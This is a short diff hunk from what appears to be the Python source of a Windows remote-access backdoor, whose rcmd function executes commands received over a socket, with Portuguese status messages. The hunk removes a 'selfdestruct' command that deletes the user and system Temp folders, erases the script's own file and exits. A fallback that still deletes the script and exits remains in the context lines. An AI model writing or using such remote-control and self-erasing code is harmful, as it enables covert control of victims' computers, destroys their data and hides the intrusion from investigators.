@@ -27,14 +27,6 @@ def rcmd(sock):
 				sock.send('[*]Movido para o diretorio: ' + os.getcwd())
 			except Exception:
 				sock.send('[-]Diretorio inexistente')
-		elif cmd == 'selfdestruct':
-			try:
-				sock.close()
-				arq_temp = ["C:/Users/{}/AppData/Local/Temp".format(username), "C:/Windows/Temp", "C:/temp"]
-				for pastas in arq_temp:
-					shutil.rmtree(pastas)
-				os.remove(filename)
-				sys.exit(0)
 			except:
 				os.remove(filename)
 				sys.exit(0)
